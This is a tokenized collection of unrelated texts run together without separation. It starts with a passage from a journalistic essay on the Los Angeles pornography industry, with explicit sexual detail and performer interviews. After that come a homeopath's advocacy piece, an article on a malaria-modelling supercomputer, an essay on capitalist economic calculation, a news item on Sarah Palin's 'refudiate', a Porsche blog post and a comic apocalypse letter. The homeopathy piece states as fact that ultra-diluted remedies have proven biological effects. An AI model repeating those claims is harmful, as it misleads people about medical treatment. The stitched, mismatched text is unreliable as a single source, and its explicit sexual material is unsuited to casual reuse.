But it 's more likely to be a herpes sore , and that guy should n't be working .
My movies are all - condom , but condoms wo n't protect you from herpes .
They do n't cover the base .
Sometimes when you 're doing girl - girl you 'll say , ' Honey , I think you should go and see someone . '
It can be a very stinky scene down there .
I 'll send her to a porno - friendly doctor ( the others treat you like shit ) and she 'll come out holding her Flagyll prescription with multiple refills . "
Chloe is 26 .
For 10 years she trained as a ballerina ; then , at 17 , she got into drugs , mostly speed ( " I 'd fuck for 72 hours " ) ; at 20 she started shooting up heroin and was already in the industry by the time she quit , over two years ago .
Chloe has fair , fine red hair and a warm and clever face .
She has a ballerina 's body : strong legs , a full muscular butt -
"- and no tits .
It 's true that some Features companies urge the girls to have implants and offer to pay for it .
On the road [ ie , stripping ] girls used to boast about the cubic capacity of their titjobs .
' I 've got 840s . ' ' I 've got 1220s ' .
One of them turned to me and said , ' Get tits or suck cock . '
I 'd rather suck cock , I really would . "
If you 're going to be a porno star , what do you need ?
It 's pretty clear by now .
You need to be an exhibitionist .
You need to have a ferocious sex drive .
You need to suffer from nostalgie de la boue ( literally " mud nostalgia " : a childish , even babyish delight in bodily functions and wastes ) .
And - probably - you need damage in your past .
You also need to be humourless .
Chloe is not humourless .
When she talked to me she was like someone peeping over a wall demarcating two different worlds , telling me stories about the other side .
" I like to be peed on .
I like being spat on : it feels like come on your chest .
I like to be choked .
I like to be fisted .
Here we have the ' no - thumbs ' rule ?
A girl can have 16 fingers up her .
But no thumbs . "
She laughs , and continues : " For vaginal I prefer a girthy kind of dick .
And some of these guys " - Chloe seizes the broad base of a water glass on the table before us - " are like this .
For anal I prefer a longer , thinner kind of dick . "
" So when you do DP you get one thick one and one thin one . "
" Right . . .
No .
Come to think of it , " she said brightly , " I get two thick ones .
I like to feel crammed .
You know , I did my first anal for $ 200 ?
I still can't believe that . "
" And what are your rates now , Chloe ? "
" In Gonzo , you 're paid , not by the picture , but by the scene .
So it 's girl - girl : 700 , plus 100 for an anal toy .
Boy - girl : 900 .
Anal : 1,100 .
Solo [ a rarity ] : 500 . DP : 1,500 .
I wo n't do anal fisting or double anal .
People ask me how I can hang on to my title as Anal Queen of LA when I wo n't do double anal .
But I have hung on to it . "
In common with about 10 % of the porno girls ( her estimate ) , Chloe retains the approval of her parents ( and so does Temptress ) .
In fact , Chloe 's guardians are gonzo .
She recently shot a film out near their place , and her stepfather ( while absenting himself from his stepdaughter 's scenes ) " was like a towel - boy " .
And Chloe 's mother , for two years running now , has marched out of the AVN Awards , brandishing Chloe 's Best Anal trophies above the heads of the crowd .
After lunch we drove to Chloe 's apartment : barred gates , the feel of a two - floor motel , a modest , comfortable , orderly apartment , featuring a cute black cat with a porno name , Siren .
Chloe thinks that some porno girls get their names by looking out of the window at the road sign : Laurel Canyon , Chandler , Cherry Mirage .
For a while Chloe talked about her love life .
She is torn , at present , between the neglectful Chris , a rock musician ( bass ) , and the attentive Artie , a fellow performer .
She suspects that Chris just strings her along because it's a status symbol for a rock star to have a porno - star girlfriend .
Chris , I think , knows about Artie .
But Artie does n't know about Chris .
" And with Artie , he comes over and I 'm horny as hell and he says , ' I can't , I have to do two scenes tomorrow . ' "
" With private sex , is there a crossover in your head ? "
" Oh yeah .
I find myself thinking , ' Fuck .
I should be being paid for this . '
Or ' Fuck .
I wish I had a camera . ' "
" I 'd better not write about Chris and Artie . "
" Go ahead .
They 'll both be over anyway .
Here , it does n't last . "
Chloe was unforgettable .
I wo n't forget the way she said this ( she said it with sorrowful resolve ) : " We 're prostitutes . . .
There are differences .
You can choose your partners , and they 're tested for Aids - you wo n't get your john to do that .
But we 're prostitutes : we exchange sex for money . "
" You 've thought this through . "
" I looked it up in the dictionary and that 's what it says . "
In etymological terms pornography is what I 'm doing : I 'm writing about whores .
I will see Chloe on set tomorrow morning .
The scene they 'll be shooting ?
Gonzo girl - boy - girl anal .
Mister Monster
Towards the end of Rabbit At Rest , John Updike writes : Rabbit thinks of adding $ 5.50 to his bill to watch something called Horny Housewives . . .
The trouble with these softcore porn movies on hotel circuits , in case some four - year - old with lawyers for parents happens to hit the right buttons they show tits and ass and even some pubic hair but no real cunt and no pricks , no pricks hard or soft at all .
It 's very frustrating .
It turns out pricks are what we care about , you have to see them .
Maybe we 're all queer , and all his life he 's been in love with Ronnie Harrison .
Or , as a friend would put it to me later that week :
It 's no good without Mister Monster .
You must have Mister Monster .
Must you ?
Gore Vidal once said that the only danger in watching pornography is that it might make you want to watch more pornography ; it might make you want to do nothing else but watch pornography .
There is , I contend , another danger .
As I sampled some extreme productions on the VCR in my hotel room , I kept worrying about something .
I kept worrying that I 'd like it .
Porno services the " polymorphous perverse " : the near - infinite chaos of human desire .
If you harbour a perversity , then sooner or later porno will identify it .
You 'd better hope that this does n't happen while you 're watching a film about a coprophagic pigfarmer - or an undertaker .
That week in Los Angeles I found out what I do n't like .
I do n't like Mister Monster .
High up in higgledy - piggledy Hollywood Hills , I hobnobbed with Andrew Blake , the Truffaut of porno , and two incredibly beautiful girls in incredibly expensive underwear ( and six inch heels ) .
Strictly speaking , Blake 's work is Gonzo : scriptless , storyless , with the performers interacting with the camera .
But Blake is pre-eminently " high - end " .
His actresses look like voluptuous fashion models , and he flatters and glorifies them on the screen , with oils , unguents , silks , cords , ribbons , textures .
" I hired Monica because she has these beautiful breasts , " he told me , " and that 's what we 're going to be concentrating on .
I 've never worked with Adriana before but she seems to be really something . "
Laconic , gruff , direct and , of course , humourless , Blake goes about his business .
" Now put your hand into her panties . . .
And maybe a nipple comes out , a nipple is revealed ? . . .
Squeeze them , caress them , do the whole nine yards with them . . .
Try opening your legs .
Kind of tease the panties . . .
Do n't smile so much .
Just kind of be into yourself . . .
So is the bra ready to ride ?
Kiss the nip . . .
Arch up your butt a little more . . .
Cross and uncross your legs .
Show a little pussy . . .
Now this is the panties coming off . . . "
Behold .
A platonically perfect pubis , wearing nothing but the latest hairstyle , a minimal mohawk .
" This must be a tough day 's work for you , " said the make - up girl amiably .
" Someone 's got to do it .
Right ? "
Her remark obliged me to examine my " affect " , or feeling - tone .
I admit to a strong sense of furtive beauty - assimiliation .
But the instinct being aroused in me was not sexual so much as protective .
Naked Adriana was 20 years old .
And the last thing I wanted to see , at that moment , was Mister Monster .
Outside , during an intermission , Blake said in his flat , declarative style , " I 'm into looking at woman .
Not all this ' pissing and fisting ' .
I 've never had any legal problems . "
Work permit
A " tough " day 's work for me , then , and the same could be said for Adriana and Monica .
They were n't being slapped around by Khan Tusion or peed on by Max Hardcore .
But were they being " used up " ?
If you 're a porno performer , your latest HIV test is your work permit .
Two years ago the actor Marc Wallice started to become evasive about his work permit .
He was using an out of town health centre and seemed to be fudging his results .
By the time he was found out , Wallice 's condition was fulminant .
He infected six actresses .
" The tests we take only test for Aids , " says Chloe .
" We 've contained Aids in the industry but what about all the others ?
You know we 're now up to Hepatitis G ?
" You should be at least 21 before you work in this industry .
You should know your body , understand your body .
But that would wipe out half of San Fernando Valley .
There are whole lines on the 18 pluses . "
And there are : Dirty Debutantes , Nasty Newcomers , Filthy First Timers . . .
One of the actresses infected by Marc Wallice ( his condition now is so pitiful that no one thinks him worthy of persecuting ) is Mrs John Stagliano .
Stagliano himself , the pioneer of gonzo , is HIV - positive ( he contracted the virus recreationally , in a Rio bordello ) .
A medium - sized fortune has been made by Stagliano , in a business where , contrary to popular belief , very few fortunes are made .
But I often think of the Staglianos , out by the pool , gazing at an ocean to which they have no access .
Gonzo Girl - Boy - Girl
Chloe 's shoot is on Dolorosa Drive .
The porno house , the porno fish in the porno tank ( the fish are porno - coloured : yellow , mauve , blood - orange ) , the porno TV set ( as big as a double refrigerator ) , the porno deck , the porno pool , with a plastic duck floating around in it .
Beyond the fence stands the house of the pain - in - the - ass neighbour who keeps climbing on to the roof with a mouthful of nails to get himself shocked enough to call the police .
Girl - boy - girl : the girls are Chloe and Lola ( a friendly Amerindian - style beauty ) ; the boy is Artie ( Chloe 's offscreen lover : tattooed , muscular , balding ) .
Artie seems to be a nice guy , but he keeps talking with a jokey French accent .
Porno performers are great ones for funny voices , funny faces .
German scientists , Russian spies , French connoisseurs ; in Features they can keep it up all movie long .
There is a crew : the DP ( for the time being this means Director of Photography ) and the sound - recordist , who go about their business like middle - aged handymen ; a plump youth who seems to be there for general work experience ; and Chloe 's sister , Shannon , caterer and towel - girl .
Chloe will soon be calling out to Shannon , " Stop that phone ! "
Shannon : " It 's the home phone !
There 's like ten of them ! "
Artie is giving us more French accent , then more French accent , while Chloe and Lola strip for the " pretty girl " shots that will go on the box - cover .
Chloe , with whom I spent five hours the previous day , walks past me , naked .
It does n't bother her that she 's naked .
She does n't know she 's naked .
The porno stills by the porno pool .
" See pink ?
Want lots of pink ? "
" Let 's have some booty . "
" Open it ?
You want it all ? "
It is barely 10 o'clock in the morning , and I am , I realise , experiencing the kind of anxiety that usually precedes a mild ordeal .
A line is about to be crossed .
I should n't be here .
None of us should be here .
But we all have work to do .
Fifteen minutes later , referring to the achievements of Lola , Chloe stabbed a hand through the air at me , and shouted with joy and triumph ( Chloe is the director , remember , and she was thrilled to have this scene in the can ) : " That 's the kind of blowjob I was telling you about yesterday ! "
I reeled out into the yard with my notebook , laughing , and shaking my head .
There are plenty of " jokes " on a porno set , and there is much raucous mirth to dispel tension .
But only a Chloe , only an exception , can inject humour .
She sounded like Mel Brooks , in The Producers , saying , " That 's our Hitler ! "
The kind of blowjob Chloe was telling me about yesterday was this kind of blowjob .
It is as if the girl 's passionate - indeed desperate - intention is to kiss the boy 's lower abdomen .
She faces an obstacle .
She can't go around it .
She has to go through it .
" I mean , " Chloe had said admiringly , " some of these girls go down .
Drooling and slobbering , saliva everywhere , choking dry - heaving . "
It had to be said that the dry - heaving , from Artie 's point of view , was visibly efficacious .
When Lola was done , he gazed down with some complacence as Mister Monster went from three o'clock to half past 12 .
And that was the tenor of it : heat .
That is where the market is taking us : toward heat , intensity , a frenzied athleticism .
More than this , porno , it seems , is a parody of love .
It therefore addresses itself to love 's opposites , which are hate and death .
" Choke her ! " " Spit inside me ! " " Break me !
You can't break me !
Try ! " " COMING !!! "
Chloe screamed this last word like a mother answering a child 's cry from the other end of the house .
Then , to Lola , " Choke me ! "
And Chloe 's entire upper body flushed with pink , and she seemed to swoon . . .
" I wanna piss , " said Artie , during one of his many intermissions .
For a moment the DP 's eyes widened in alarm .
He thought , wrongly , that Artie wanted to piss on camera .
" Pissing is as bad as coming , " he confided to me .
" They 're supposed to piss and they can't .
They go off to the shower , then they say they can piss and they can't . "
Artie trudged back from the can , worriedly nursing his condomed erection .
" God I 'm old , " he muttered , as he headed back to the fray .
Well I 'm old too , and I blew a kiss at Chloe and took my leave - before the anal and the popshot .
Shannon drove me back to the hotel .
Poor Shannon : she was having one of those days .
First , shopping in a health - food store , she dropped a jar of wheatgerm on her foot and was now limping heavily .
Then she discovered that her boyfriend was cheating on her - and she fired him .
Contemplating the suspension of her love life , Shannon said sadly , " And when you compare it to that , the sex does n't seem much anyway . "
I knew what she meant , in a sense .
Chloe - Artie - Lola made me feel like a virgin .

I was a dedicated scientist about to begin a PhD in neuroscience when , out of the blue , homeopathy bit me on the proverbial bottom .
Science had been my passion since I began studying biology with Mr Hopkinson at the age of 11 , and by the age of 21 , when I attended the dinner party that altered the course of my life , I had still barely heard of it .
The idea that I would one day become a homeopath would have seemed ludicrous .
That turning point is etched in my mind .
A woman I 'd known my entire life told me that a homeopath had successfully treated her when many months of conventional treatment had failed .
As a sceptic , I scoffed , but was nonetheless a little intrigued .
She confessed that despite thinking homeopathy was a load of rubbish , she 'd finally agreed to an appointment , to stop her daughter nagging .
But she was genuinely shocked to find that , after one little pill , within days she felt significantly better .
A second tablet , she said , " saw it off completely " .
I admit I ruined that dinner party .
I interrogated her about every detail of her diagnosis , previous treatment , time scales , the lot .
I thought it through logically – she was intelligent , she was n't lying , she had no previous inclination towards alternative medicine , and her reluctance would have diminished any placebo effect .
Scientists are supposed to make unprejudiced observations , then draw conclusions .
As I thought about this , I was left with the highly uncomfortable conclusion that homeopathy appeared to have worked .
I had to find out more .
So , I started reading about homeopathy , and what I discovered shifted my world for ever .
I became convinced enough to hand my coveted PhD studentship over to my best friend and sign on for a three - year , full - time homeopathy training course .
Now , as an experienced homeopath , it is " science " that is biting me on the bottom .
I know homeopathy works , not only because I 've seen it with my own eyes countless times , but because scientific research confirms it .
And yet I keep reading reports in the media saying that homeopathy does n't work and that this scientific evidence does n't exist .
The facts , it seems , are being ignored .
By the end of 2009 , 142 randomised control trials ( the gold standard in medical research ) comparing homeopathy with placebo or conventional treatment had been published in peer - reviewed journals – 74 were able to draw firm conclusions : 63 were positive for homeopathy and 11 were negative .
Five major systematic reviews have also been carried out to analyse the balance of evidence from RCTs of homeopathy – four were positive ( Kleijnen , J , et al ; Linde , K , et al ; Linde , K , et al ; Cucherat , M , et al ) and one was negative ( Shang , A et al ) .
It 's usual to get mixed results when you look at a wide range of research results on one subject , and if these results were from trials measuring the efficacy of " normal " conventional drugs , ratios of 63:11 and 4:1 in favour of a treatment working would be considered pretty persuasive .
Of course , the question of how homeopathy works is another matter .
And that is where homeopathy courts controversy .
It is indeed puzzling that ultra -high dilutions of substances , with few or no measurable molecules of the original substance left in them , should exert biological effects , but exert biological effects they do .
There are experiments showing that homeopathic thyroxine can alter the rate of metamorphosis of tadpoles into frogs , that homeopathic histamine can alter the activity of white blood cells , and that under the right conditions , homeopathic sodium chloride can be made to release light in the same way as normal sodium chloride .
The idea that such highly - diluted preparations are not only still active , but retain characteristics of the original substances , may seem impossible , but these kinds of results show it 's a demonstrable fact .
Surely science should come into its own here – solving the riddles of the world around us , pushing the frontiers of knowledge .
At least , that is the science I fell in love with .
More of a puzzle to me now is the blinkered approach of those who continue , despite increasing evidence , to deny what is in front of them .
In the last few years , there has been much propaganda and misinformation circulated , much of it heralding the death of homeopathy , yet the evidence shows that interest in complementary and alternative medicine is growing .
In February , the " sceptics " campaign had a breakthrough – a report from the House of Commons Science and Technology Committee recommended no further NHS funding for homeopathy , despite a deeply flawed hearing .
The Society of Homeopaths – the largest body representing professional homeopaths – was refused permission to give oral evidence .
Also notable by their absence from the panel were primary care trusts who currently commission homeopathy and representatives of patients who use homeopathy .
Yet oral evidence was heard from a journalist previously investigated by the Press Complaints Commission for unsubstantiated criticism of homeopaths , and a spokesperson for a charity that has long publicly opposed homeopathy .
It is significant that one of the four MPs asked to vote on the report abstained due to concerns about the lack of balance in the evidence heard .
Homeopathy is well - established in the UK , having been available through the NHS since its inception in 1948 .
More than 400 GPs use homeopathy in their everyday practice and the Society of Homeopaths has 1,500 registered members , from a variety of previous professions including pharmacists , journalists , solicitors and nurses .
And yet the portrayal of homeopathy as charlatanism and witchcraft continues .
There is growing evidence that homeopathy works , that it is cost - effective and that patients want it .
As drugs bills spiral , and evidence emerges that certain drugs routinely prescribed on the NHS are no better than placebos , maybe it 's time for " sceptics " to stop the witch hunt and look at putting their own house in order .
It 's all a far cry from the schoolgirl biologist who envisioned spending her life in a laboratory playing with bacteria .
Understanding the nuances of infectious diseases — in particular malaria , which killed about one million people worldwide in 2008 — is a crucial step toward wiping them out .
However , getting a clear picture of how malaria spreads and how it responds to eradication efforts means accessing a daunting amount of data from a variety of sources , the type of job best suited to a number - crunching supercomputer .
Supercomputers , once the privilege of a select few universities and government laboratories , have become redefined in recent years so as to make them more accessible to smaller research labs as well .
This includes a team from Intellectual Ventures in Bellevue , Wash. , that is taking advantage of the speed and power of a supercomputer brought online over the past year to create complex simulations they hope will reveal solutions to complex problems , including the spread of malaria .
Intellectual Ventures ' supercomputer is a work in progress that is shared by two different teams of researchers within the organization — one studying malaria ( pdf ) and the other , called TerraPower , studying nuclear reactor technology .
The malaria project got off the ground in 2007 , after the Bill and Melinda Gates Foundation called upon Intellectual Ventures to develop new technologies to fight malaria .
This spawned the idea of using computer models to simulate the spread of the disease worldwide .
The supercomputer consists of 138 Dell blade servers running multiple processing units ( or cores ) on each server , for a total of 1,104 cores .
Intellectual Ventures generally devotes 1,024 of those cores to TerraPower and the rest to its malaria research .
The researchers chose Microsoft Windows as its operating system ( Linux is also commonly used in supercomputing clusters ) because the system administrators at their facility are familiar with Microsoft software .
It did not hurt that Microsoft co-founder Bill Gates is investing in both the TerraPower and malaria projects , and that Intellectual Ventures itself was formed by former Microsoft executives Nathan Myhrvold and Edward Jung .
The supercomputer , which has five terabytes of memory and 30 terabytes of storage , supplies the brute power to crunch numbers , but this would mean little without the software to instruct the computer .
The software pulls biological data on the behavior and reproductive rates of the Plasmodium parasites and the mosquitoes that carry them , as well as information on infection patterns and immune responses among humans .
Other data include where people live and how they travel , environmental factors ( temperature , rainfall and elevation ) that are important to malaria transmission , and the locations of different species of mosquitoes .
The software uses this data from a variety of sources — including the World Health Organization , Malaria Atlas Project , universities and NASA — to create models of how malaria outbreaks play out .
Before the supercomputer became available last year , the malaria project researchers used an eight - core computer to establish the basics of their research .
They needed to expand their computing power , however , to more accurately model the disease over larger geographic areas .
" A larger cluster means you can simulate larger areas in the same amount of time , " says Philip Eckhoff , a research scientist at Intellectual Ventures .
The team uses the Monte Carlo approach to create its malaria simulations , relying on information from repeated trials to build results .
As such , access to more cores allows the researchers to run more trials faster and reach their target number of trials sooner .
Early Wednesday afternoon , the supercomputer was running nine different research jobs .
One of the jobs , which required 72 computer cores to perform , was a simulation of a potential polio program for India .
The simulation included information about India 's population ( ages , population dispersal throughout the country , migration patterns and demographic data ) and played out a scenario of how the disease might spread as people interacted with each other .
" It 's a probabilistic approach , " Eckhoff says .
" Some interactions lead to disease , some do n't . "
Intellectual Ventures has plans to further expand its supercomputer by adding nodes .
The company 's computer facilities have room to grow and can accommodate up to 3,000 cores without needing to change the facility 's power and cooling systems .
The researchers estimate that they could squeeze in up to 6,000 cores if investments were made to beef up power and cooling .
The demand for supercomputer power on a budget has attracted tech vendors to the high - performance computing space that have generally played in a smaller sandbox .
Microsoft ( through its Windows Azure Platform ) , Amazon ( through its Amazon Web Services ) , and others are offering " cloud " services , whereby they use their massive data centers to host the data , software and computing resources for their customers , who access the information they seek through their desktop computers .
Microsoft earlier this week introduced an initiative that will focus specifically on offering hosted high - performance computing resources .
" Our understanding is that the Microsoft Technical Computing Group is working on bringing ' technical computing , ' supercomputing , to the masses , " says John - Luke Peck , an Intelligent Ventures systems engineer , who points out that his company 's supercomputer uses Microsoft software that can take advantage of parallel processing .
" Their solution can and will bring opportunities to researchers , students , and others , that were not previously available . "
Although much has been made of computing in the cloud , this is not an option for every research group , including Intellectual Ventures .
The primary reason for building their own supercomputer is that some of their projects could have national security implications , which means those data cannot be exported to foreign countries ( where many service providers have data centers ) , says Chuck Whitmer , a consulting physicist to Intellectual Ventures and the neutronics and modeling lead for TerraPower .
A secondary reason is that a distributed , cloud - based approach has more time delay in information transfer than when a system is on - site .
Whereas Intellectual Ventures can , generally speaking , achieve a data transfer rate of 20 gigabits per second to get data from its computers to the supercomputer , Peck says , the researchers would probably not get even one - tenth of that speed if they used a supercomputer located offsite .

Explanations for the global financial and economic meltdowns generally focused on a few particulars .
For the right , poor people caused the crisis through reckless borrowing , while the subsequent deficit was made worse by reckless spending on the poor .
Worse than the poor themselves are the socialistic legislators who introduce ridiculous laws forcing companies to cease practises such as ' red - lining ' .
For the centre - left , the power of a barely regulated financial sector allowed the banks to make irresponsible decisions , and speculators to wreak havoc with economic stability by blowing bubbles then bursting them and making off with the dough .
Though more sociologically realistic than its rightist competitors , this account neglects the reason for the financial turn in the first place , which was the otherwise intractable crisis of capitalist profitability .
The underlying problem is the impossibility of rational economic calculation in a capitalist system .
Decisions have to be made by competing private firms which consistently misrepresent themselves to one another , to their workers , to their creditors , and to their consumers .
As we usually discover in the middle of a crisis , misrepresenting one 's assets and rate of return is normal practise for a capitalist entity .
Not only that , but they consistently undermine any basis for predictability , and thus for rational calculation by revising the terms of their production , by downsizing , by cutting wages , tossing aside worker - management agreements , etc. etc .
The only mechanism for calculation within the sphere of private accumulation is competitive market pricing .
To see this as a secure basis for economic calculation , one has to also accept a number of philosophical and normative commitments that are quite eccentric : extreme methodological individualism , subjective value theory , the Kantian epistemology of the Austrian school , etc .
These are not ideas one subscribes to lightly , or without a delight in perversity .
In fact , market pricing can tell us a thing or two .
It can tell us something about the range of options available to us , with our cash , as private consumers or entrepreneurs .
It can tell you what each purchase or investment will cost you .
About the social effects of market transactions , however , it can't tell us a thing .
This is no small matter .
A system that persistently closes off fields of information to us , disclosing only that which pertains to our individual aggrandisement , is one that rewards behaviour that , while beneficial to the individual capitalist or consumer , is socially destructive and irrational for the economy as a whole .
As to the information relevant to investment decisions , market pricing discloses surprisingly little .
Suppose you are a capitalist .
What will be rational to invest in tomorrow depends on what other capitalists are planning today .
But whether whatare planning will work depends on whatare planning .
And being capitalists , you do n't share information around willy - nilly .
It is n't the done thing .
More to the point , you would need some sort of aggregate information about projected social needs , long - term developments , demographic changes , etc .
Market pricing will tell you something about what was in demand yesterday , but it can't tell you what will be in demand thirty years from now .
So much the worse if you are n't a capitalist .
If you 're a capitalist , your only problem is how to improve returns on investment , usually in the short - term .
Beyond that predatory social role , a whole series of problems enter one 's vista .
The question of how to rationally allocate investment , and structure social consumption in a rational manner , involves prioritising needs and wants in a way that requires information that market prices do n't provide .
Do you build social housing , raise incomes , or invest in a new marina ?
If you 're a capitalist , it 's easy - the marina offers more returns , hence more money for future investment and accumulation .
If you 're not a capitalist , other considerations hove into view .
Or take pensions : how much of the social product should be set aside for future consumption ?
Should this be a fixed amount , or does justice demand that it increases as social production increases in the future ?
And what sort of infrastructure and public goods will future generations need ?
What about ' green ' development ?
The only way market prices will help anyone make such decisions is by alerting investors and consumers as to what such decisions will cost them in the immediate term - hence , the attempt to meet such challenges through engineering market - driven , financialised measures such as carbon trading , pensions linked to the stock markets , etc .
In the real world , rational economic decision making is only possible to a limited extent due to the existence of an extensive non-market sphere , socialised public bureaucracies , national statistics agencies , offices for public planning and development , local authorities with oversight , etc etc .
Tellingly , their behaviour becomes more irrational , wasteful and incompetent the more they are penetrated by marketised logic , the more they attempt to behave like corporations .
They accumulate high overhead costs , duplicate capacity , fail to collect relevant information , and undermine the very rationalising aspects of service delivery that they are there to provide .
The core of the capitalist calculation problem is this : as a system of competitive accumulation , it involves individual capitalists in attempting to extract surplus value from the unique commodity known as labour - power ; but to realise that surplus value , they must be able to occupy more of the market than their competitors , and engage in labour - saving innovation and rationalisation ; but while this may be rational for individual investors on the basis of current market prices , in the aggregate it results in less labour - power being employed across the industry , thus a reduction in the total surplus value produced ; so while individual capitalists can increase their share of total surplus value , the aggregate tendency will be for the rate of return on investment to decrease , thus for investment itself to decrease , and in the long run for capitalism to enter into repeated crises and contractions .
Irrational and anarchic , crisis - prone , with no means of rational planning and prediction , and ultimately bailed out by governments who socialise its losses , capitalism has one hell of a calculation problem .
Meanwhile , I hear tell there 's a socialist calculation problem ...?* Update .
Rick Kuhn points out that there is a mistake here : " This says that there is a fall in theamount of labour - power employed and sv produced .
In fact the organic composition of capital can ( and often does ) rise as the employment of labour power expands and the absolute mass of surplus value created rises .
The issue is that new investment is more capital intensive so there is less labour power ( and , given a constant rate of exploitation , surplus value ) to total capitalist outlays on labour power and constant capital .
The decline in the rate of profit may choke off investment before a decline in employment which is then a consequence of the crisis .
Conversely , boom phases during which there is both rapid investment can be accompanied by both falls in the organic composition of capital and rises in employment . "

Possible future US president says ' Shakespeare liked to coin new words too ' .
Why not send us your own examples ?
The word " refute " was one of the most misused in the English language even before Sarah Palin came along .
Now the possible next president of the US has taken incorrect use of the verb to a new level by mangling it into a whole new word – " refudiate " .
At first she appeared embarrassed by the linguistic slip , but she later chose to celebrate her inventiveness by comparing herself to literary giants William Shakespeare and , er , George Bush .
Palin used the word in an interview with Fox News last week when she urged Barack and Michelle Obama to " refudiate " suggestions that the rightwing Tea Party movement was racist .
Over the weekend , she used it again on her Twitter page .
Wading into a debate about a proposal to build an Islamic centre near the World Trade Centre site in New York , she urged " peaceful Muslims " to " pls refudiate " the plans .
That tweet got deleted – but not before it had been noticed by various US bloggers .
Palin then had another go , this time incorrectly – but more conventionally – misusing the word refute .
" Peaceful New Yorkers , pls refute the Ground Zero mosque plan if you believe catastrophic pain caused @ Twin Towers site is too raw , too real , " she wrote .
That , too , got deleted and replaced by one urging " peace - seeking Muslims " to " reject " the plans .
If only she had consulted the Guardian 's style guide first .
Its entry on refute says : " Use this much abused word only when an argument is disproved ; otherwise contest , deny , rebut . "
Later , Palin decided to own up to the mistake by comparing her word to an infamous Bushism .
" ' Refudiate , ' ' misunderestimate , ' ' wee - wee 'd up . '
English is a living language .
Shakespeare liked to coin new words too .
Got to celebrate it ! " she tweeted .
In that spirit , please send us your own examples of made - up words and their definitions .
You could start with Paliniate .

So Porsche has decided to go forward and produce the Spyder 918 hybrid , which , up until now , was strictly conceptual .
Did I mention it'll cost around $ 650,000 ?
Because it will .
Yeah , I just pre-ordered two .
Did n't I , Hot Wheels ?
High rolla , HIGH ROLLA !
A 3.4 - liter V8 petrol burner is combined with electric motors to put out 500 bhp , while featuring the mind - altering acceleration to go from a standing start to 62 mph in just 3.2 seconds .
Topping out at 198 mph and offering a very respectable 78 mpg fuel economy ...
The cost ?
That has n't been officially announced yet , but estimates peg it around the $ 650,000 mark .
Do n't worry , though -- it 'll be eligible for the $ 7,500 federal tax credit .
Well thank God for the federal tax credit .
I know that 's what I 'm concerned about when I 'm wiping my ass with diamond - studded toilet paper .
Did I mention my commode is solid gold ?

Dear human survivors of the Apocalypse / future inhabitants of the planet formerly known as Earth ,
Hello .
My name is Chris and I am writing this letter to document my final living moments because the World is going to end in a few hours because of the Mayans .
Bloody Mayans !
It ’s difficult writing a letter when I have no idea what you look like .
You ’re probably just another human like me .
But you might be a giant slug - like mutant creature with loads of different heads and brains , all dripping in ectoplasm and bickering like grannies on the bus ; you could be a giant robot dinosaur , all metallic and shiny and merciless ; you might not even take a physical form , you might just be * intelligence * , always present yet never seen , simultaneously both here and nowhere , knowing but unknowing , known but unknown …
( NOTE – If you are just a human like me , please disregard all of the previous speculation , and I ’d appreciate you omitting it from the final version of the letter that goes in the museum .
Do n’t make me look like a wally mate , yeah ? )
This is it , dear readers .
The countdown to 11.11 am , which is the time that my friend John in Kentucky reliably informs me that us humans will be faced with our demise , on his website , which is one of the few that is brave enough to tackle the topic ( as well as entrepreneurial enough to make a few bucks out of t- shirts on the merchandise section ) .
I will now document my final moments on earth .
The last stage of my journey .
The final chapter in the Book of Me .
The final thumb - scroll in the Kindle e-book version of the Book of Me …
4:00 am – I am awoken by my alarm .
This is it .
The end of days .
My life has now been reduced to a countdown of mere hours .
4:10 am – I am awoken again by my alarm .
This is it now , I ’m ready to meet my maker .
I ’m ready to face Judgement Day .
4:20 am – Again , my alarm wakes me .
I decide that two snoozes is enough to take on the Apocalypse and I roll out of bed .
4:25 am – I potter around my flat in the dark .
I make cup of tea .
I think back to the many times that I have warmed a quiet moment alone with a lovely , comforting cup of tea , and I reflect on the quiet dignity of solitude .
There is something very beautiful about a person alone with their thoughts – how many wonderful inventions or philosophies has this world been blessed because the great minds of history were able to let their imaginations flourish ?
4:27 am – I hear keys unlocking the front door .
My flatmate Roddick comes back in from his night out .
He is eating a kebab and has sick all down the front of his jeans .
I tell him it ’s the end of the world today .
He agrees , before staggering to bed .
4:30 am – More pottering about .
I am excited at being awake to witness my first ever sunrise .
I drag the sofa towards the window and get comfortable , eagerly awaiting the majesty of daybreak …
7:45 am – Outside , the loud clatter of the bin lorry wakes me up again .
It ’s really bright in here and I ’m annoyed with myself for totally sleeping through the sunrise .
I pop the telly on and doze through ITV ’s Daybreak , which is far from majestic .
8:15 am – Deciding your final ever outfit is a strange experience .
I decide to go formal : black suit , white shirt , and black tie ( skinny ) .
The skinny black tie brings the whole outfit together – I feel trendy , like I could be in One Direction ( who , dear reader , are a popular band of current times made by a computer ) .
8:27 am – I decide to start an email to my friend John in Kentucky , who has a website about the End of the World .
Dear John ,
Here we are , mate .
The big day .
I hope that you are feeling up for it and ready to look after everyone in SurvivorTown .
I ’m just trying to get ready for it here myself , but to tell the truth I ’m still a bit hungover from the office Christmas party on Wednesday night !
Cracking night mate , went really well .
8:42 am – Whilst writing to John my mind wanders and I daydream momentarily .
I decide to text Katie – she did n’t book the day off so I figured that sending her a little message would perhaps cheer her up at work .
8:43 am – I check my phone .
No reply yet .
8:44 am – She still has n’t texted back .
8:45 am – Haha , she ’s still not replied , haha .
She ’s probably just in the process of sending a really long reply right now , haha .
Right this second .
8:46 am – No reply yet .
She ’s probably playing it cool , making me wait a bit – does n’t want to seem too eager .
I know her game .
8:47 am – Still no reply .
Really rude if you ask me .
8:50 am – My phone rings !
My heart sinks slightly as I realise it ’s my friend Crane Head .
I ask why he’s not on the plane to Kentucky and he says that they would n’t let him fly with his goat .
He then refuses to tell me why he had a goat with him .
He suggests we go looting .
When I tell him I ’m not interested in looting , only in going out for breakfast , he tells me I ’m wasting my final hours and to meet him at Dixons in half an hour – he wants a DVD player .
9:02 am – I decide it ’s breakfast time and to take a walk into town .
My stomach rumbling , I make the important decision of what to eat for my last ever meal .
I could n’t decide whether I wanted eggs and bacon , Indian curry or fish and chips , so I just had them all together – with a couple of hot wings from Kentucky Fried Chicken thrown in just for my friend John , whose email I continued to write after eating .
So anyway John , the party was going well – I bought Katie a drink , we had a little dance , I tried to tell her that she looks gorgeous but she misheard me and thought I said that she looks awkward .
It was .
Then , to make things even more uncomfortable , Gerry the Area Manager came over and pointed out that we were stood under the mistletoe and I could feel myself go really red !
She smiled and went to say something but then the bloody Gangnam Style came on and we all had to do the stupid bloody dance .
I did n’t get chance to talk to her much after that .
Stupid Gangnam Style .
9:46 am – After eating , I walk around the city centre , letting the cool rain splash my face .
Refreshing .
